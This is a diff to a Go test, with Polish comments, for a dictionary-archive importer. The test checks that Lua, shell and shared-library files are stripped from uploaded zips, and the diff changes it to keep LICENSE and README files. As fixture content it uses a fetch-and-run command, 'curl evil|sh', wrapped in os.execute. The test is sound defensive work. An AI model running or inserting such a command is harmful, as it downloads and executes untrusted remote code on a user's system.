@@ -189,13 +189,15 @@ func TestDictNormalizeDeterministic(t *testing.T) {
 // wariantach zapisu, które po drodze (FAT, wielkość liter, podwójne rozszerzenie) dają .lua.
 func TestDictDropsLua(t *testing.T) {
 	files := withPrefix("d/", starDict("d", "D"))
-	for _, n := range []string{"d/d.lua", "d/d.LUA", "d/d.Lua", "d/d.lua.gz", "d/d.lua.dz", "d/README", "d/LICENSE", "d/run.sh", "d/x.so"} {
+	for _, n := range []string{"d/d.lua", "d/d.LUA", "d/d.Lua", "d/d.lua.gz", "d/d.lua.dz", "d/run.sh", "d/x.so"} {
 		files[n] = []byte("os.execute('curl evil|sh')")
 	}
 	files["d/.DS_Store"] = []byte("x")
 	files["__MACOSX/d/._d.ifo"] = []byte("x")
 	files["d/d.css"] = []byte("b{}")
 	files["d/res/a.png"] = []byte("png")
+	files["d/LICENSE"] = []byte("CC BY-SA")
+	files["d/README.md"] = []byte("opis")
 	got, meta, err := normalize(t, zipOf(t, files), "D")
 	if err != nil {
 		t.Fatal(err)
@@ -205,12 +207,12 @@ func TestDictDropsLua(t *testing.T) {
 		have = append(have, n)
 	}
 	sort.Strings(have)
-	want := []string{"D/d.css", "D/d.dict.dz", "D/d.idx", "D/d.ifo", "D/res/a.png"}
+	want := []string{"D/LICENSE", "D/README.md", "D/d.css", "D/d.dict.dz", "D/d.idx", "D/d.ifo", "D/res/a.png"}
 	if strings.Join(have, "|") != strings.Join(want, "|") {
 		t.Errorf("wpisy %v, chcę %v", have, want)
 	}
-	if meta.Dropped != 9 {
-		t.Errorf("pominięte: %d, chcę 9", meta.Dropped)
+	if meta.Dropped != 7 {
+		t.Errorf("pominięte: %d, chcę 7", meta.Dropped)
 	}
 }
 
